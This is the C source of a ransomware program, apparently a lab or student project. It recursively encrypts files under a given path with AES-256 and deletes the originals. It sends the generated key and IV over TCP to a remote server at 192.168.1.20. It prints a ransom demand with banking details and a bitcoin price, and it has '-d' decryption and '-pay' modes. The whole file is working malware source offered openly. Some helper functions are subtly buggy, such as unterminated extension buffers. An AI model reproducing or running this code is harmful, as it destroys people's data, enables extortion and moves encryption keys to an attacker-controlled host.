#include "ransomlib.h"
#include <dirent.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <sys/stat.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <errno.h>
// for time
#include <time.h>

#define SIZEKEY AES_256_KEY_SIZE
#define SIZEIV AES_BLOCK_SIZE

// ========================== Functions signatures ==========================

void usage(void);
void status(void);
void decryptionMessage(void);
int is_encrypted(char *filename);
int isVideo(char *filename);
int receive_key(char *pKey, char *pIv);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);
void freeMemory(unsigned char *buffer, int size);
int sendPayment(void);
int checkRep(char *nameRep);
int isCryptableFile(char* pathfile, char *filename);

// ============================== MAIN function ==============================

int main (int argc, char * argv[]){

	clock_t begin = clock();
	
	// variables
	unsigned char *key, *iv;
	char *pKey, *pIv;
	char *name = calloc(256,sizeof(char));
	key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
	iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
	pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
	pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));
	
	if(argc>2){
		strcpy(name,argv[2]);
	}
	if(!strcmp(argv[1],"-usage")){							// Display ransomware help
		usage();
	}
	if(!strcmp(argv[1],"-e")){								// Encryption mode
		
		if(argc!=3){
			usage();
			return -1;
		}
		generate_key(key,SIZEKEY,iv,SIZEIV,pKey,pIv); 		// generate AES-256 key and 128 bits iv
		send_key(pKey,pIv);									// send key and iv to store them into server

		listdir(name,iv,key,argv[1][1]);					// move through the file tree recursively
		system("clear");
		status();											// Display the Encryption message
	}
	if(!strcmp(argv[1],"-d")){								// Decryption mode
	
		system("clear");
		if(argc==5){										// if pKey and pIv are filled in the program call
			strncpy((char*)pKey,argv[3],SIZEKEY*2);			
			strncpy((char*)pIv,argv[4],SIZEIV*2);
		}
		else{
			receive_key(pKey,pIv);							// else client calls the server to receive pKey and pIv
		}
		hexa_to_bytes(pKey, key, SIZEKEY);					
		hexa_to_bytes(pIv, iv, SIZEIV);

		listdir(name,iv,key,argv[1][1]);					// move through the file tree recursively
		system("clear");
		decryptionMessage();								// display the decryption message
	}
	if(!strcmp(argv[1],"-pay")){							// Pay the ransom
		
		if(argc!=2){
			usage();
			return -1;
		}
		sendPayment();										// send payment to server
	}
	double time_spend = (double)(clock()-begin)/CLOCKS_PER_SEC;
	printf("> Execution time : %f sec\n",time_spend);

	// Free memory
	freeMemory(key,SIZEKEY+1);
	freeMemory(iv,SIZEIV+1);
	freeMemory((unsigned char *)pKey,(SIZEKEY*2)+1);
	freeMemory((unsigned char *)pIv,(SIZEIV*2)+1);

	return 0;	
}
// ========================== Functions implementation ==========================

void usage(void){

	printf("\033[0;32m");
	printf("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\tRANSOMWARE USAGE\t=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=");
	printf("\033[0m");
	printf("\n\n\t[options]\n\n\t-e\tRansomware encryption mode\n\n\t\tExample :\t./ransom -e [path]\n\n\t\t> path\tStart path of encryption or decryption\n\n\t-d\tRansomware decryption mode\n\n\t\tExample :\t./ransom -d [path] [key] [iv]\n\n\t\t> path\tStart path of encryption or decryption\n\t\t> key\tAES-256-CBC symetric key in hexadecimal [char *] - optional parameter\n\t\t> iv\tInitializing vector in hexadecimal [char *] - optional parameter\n\n\t-pay\tRun this to pay the ransom\n\n\t\tExample :\t./ransom -pay\n\n\n\t-usage\tDisplay the help\n\n\t\tExample :\t./ransom -usage\n");
	printf("\033[0;32m");
	printf("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n");
	printf("\033[0m");
}

void status(void){
	
	usage();

	printf("\033[0;31m");
	printf("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\tYOUR FILES ARE ENCRYPTED\t=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n\n\tDon't worry, you can recover your files !");
	printf("\033[0m");	
	printf("\n\n\t[$] Banking details : ");
	printf("\033[0;35m");
	printf("CH0070070070070070071");
	printf("\033[0m");
	printf("\n\n\t[$] Ransom Price : ");
	printf("\033[0;33m");
	printf("10.000 BTC");
	printf("\033[0m");
	printf("\n\n\t> Please pay the ransom to receive your decryption key !\n");
	printf("\n\n\tRun this to pay the ransom >\t./ransom -pay\n");
	printf("\033[0;31m");
	printf("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n");
	printf("\033[0m");
	printf("\n");
}

void decryptionMessage(void){

	printf("\033[0;32m");
	printf("\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n\n\t\tDECRYPTION COMPLETE !\n\n\t\tSEE YOU SOON ;-)\n\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n");
	printf("\033[0m");
}

int is_encrypted(char *filename){

	char *extFile = NULL;
	int extSize = 5;
	extFile = calloc(extSize,sizeof(char));
	
	int len = strlen(filename);
	for(int index=len-1;index>len-6;index--){
		extFile[extSize-1] = filename[index];
		extSize--;
	}
	if(strcmp(extFile,".Pwnd")==0){
		return 1;
	}
	else{
		return 0;
	}
}

int isVideo(char *filename){

	char *extFile = NULL;
	int extSize = 4;
	extFile = calloc(extSize,sizeof(char));
	int len = strlen(filename);

	for(int index=len-1;index>len-5;index--){
		extFile[extSize-1] = filename[index];
		extSize--;
	}	
	if(strcmp(extFile,".avi")==0 || strcmp(extFile,".mov")==0 || strcmp(extFile,".mp4")==0 || strcmp(extFile,".wmv")==0 || strcmp(extFile,".flv")==0){
		return 1;
	}
	else{
		return 0;
	}
}

int receive_key(char *pKey, char *pIv){
	
	// Send action code to server
	int sockid = socket(AF_INET,SOCK_STREAM,0);

	char serverIP[12] = "192.168.1.20";
	int serverPort = 2220;

	struct sockaddr_in server_addr, client_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(serverPort);
	server_addr.sin_addr.s_addr = inet_addr(serverIP);
	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(serverPort);
	client_addr.sin_addr.s_addr = inet_addr("192.168.1.10");
	
	char buffer[1024];
	buffer[0] = 'R';

	connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

	send(sockid,(const char *)buffer,1,0);

	close(sockid);

	// Reopen socket to receive pKey and pIv
	sockid = socket(AF_INET,SOCK_STREAM,0);
	
	if (setsockopt(sockid, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0){
    		perror("setsockopt(SO_REUSEADDR) failed");
    		return -1;
	}
	
	char *buffer_2;
	buffer_2 = calloc(1024,sizeof(char));
	int length_msg, len, client_socket;

	int bind_result = bind(sockid,(const struct sockaddr *)&client_addr,sizeof(client_addr));

	if(bind_result<0){
		printf("Error during binding\n");
		return -1;
	}

	printf("[+] Listening on %s:%d\n",serverIP,serverPort);
	length_msg = listen(sockid,1);

	if(length_msg<0){
		printf("Error during listen\n");
		return -1;
	}
	len = sizeof(client_addr);
	client_socket = accept(sockid,(struct sockaddr *)&server_addr,(unsigned int *)&len);

	if(client_socket<0){
		printf("Error during accept\n");
		return -1;
	}
	else{
		printf("[+] Accepted connection from %d %s:%d\n",client_socket,inet_ntoa(server_addr.sin_addr),server_addr.sin_port);
	}
	int success = 0;
	while(success <=10){
		
		length_msg = recv(client_socket,buffer_2,1024,MSG_WAITALL);

		if(length_msg>=0){
			success = 11;
		}
		else{
			success++;
			sleep(2);
		}
	}
	close(sockid);

	strncpy(pKey,buffer_2,SIZEKEY*2);
	strncpy(pIv,buffer_2+(SIZEKEY*2),SIZEIV*2);
	
	return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){

	char *newPath;
	newPath = calloc(4096,sizeof(char));
    struct dirent *rep;
	DIR *dir;
	dir = opendir(name);
	
	if(dir == NULL){												// Avoid abort program if directory is empty
		perror(name);
		exit(EXIT_FAILURE);
	}
    while((rep = readdir(dir)) != NULL){
        if(rep->d_type == DT_DIR){
			char *nameRep;
			nameRep = calloc(256,sizeof(char));
			strcpy(nameRep,rep->d_name);
			if(strcmp(nameRep,".")!=0 && strcmp(nameRep,"..")!=0 && checkRep(nameRep)!=0){
				strcpy(newPath,name);
				strcat(newPath,"/");
				strcat(newPath,nameRep);
				listdir(newPath,iv,key,de_flag);					// function recursive call
			}
		}
		else{
			char *nameFile;
			nameFile = calloc(256,sizeof(char));		
			strcpy(nameFile,name);
			strcat(nameFile,"/");
			strcat(nameFile,rep->d_name);
			
			printf("\t[FILE] %s\n",nameFile);
			if(de_flag=='e' && isCryptableFile(nameFile,rep->d_name)==1){
				encrypt(key,iv,nameFile);
				remove(nameFile);	
			}
			else if(de_flag=='d' && is_encrypted(nameFile)==1){
				decrypt(key,iv,nameFile);
				remove(nameFile);
			}
			else{
				perror("Error");
			}
		}
    }
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
	  
	if(RAND_bytes(key, sizeKey) != 1) {
    	OPENSSL_cleanse(key,sizeKey);
  	}
	if(RAND_bytes(iv, sizeIv) != 1){
		OPENSSL_cleanse(iv,sizeIv);
	}
	bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);

	return 0;
}

int send_key(char *pKey, char *pIv){

	char *buffer = calloc(1024,sizeof(char));
	buffer[0] = 'S';
	strncat(buffer,pKey,SIZEKEY*2);
	strncat(buffer,pIv,SIZEIV*2);

	int sockid = socket(AF_INET,SOCK_STREAM,0);

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(2220);
	server_addr.sin_addr.s_addr = inet_addr("192.168.1.20");
	
	connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

	send(sockid,(const char *)buffer,strlen(buffer),0);

	close(sockid);
	
	return 0;
}

void freeMemory(unsigned char *buffer, int size){

	memset(buffer, 0, size);
	free(buffer);
}

int sendPayment(void){
	
	char *buffer = calloc(1024,sizeof(char));
	buffer[0] = 'P';

	int sockid = socket(AF_INET,SOCK_STREAM,0);

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(2220);
	server_addr.sin_addr.s_addr = inet_addr("192.168.1.20");
	
	connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

	if(send(sockid,(const char *)buffer,strlen(buffer),0) > 0){
		printf("Sending payment of 10.000 BTC to CH0070070070070070071 . . .\n");
	}

	close(sockid);

	return 0;

}

int checkRep(char *nameRep){

	if(nameRep[0]=='.'){
		return 0;
	}
	else{
		return -1;
	}
}

int isCryptableFile(char* pathfile, char *filename){

	if(is_encrypted(pathfile)==0 && isVideo(pathfile)==0 && strcmp(filename,"ransom")!=0){
		return 1;
	}
	else{
		return 0;
	}
}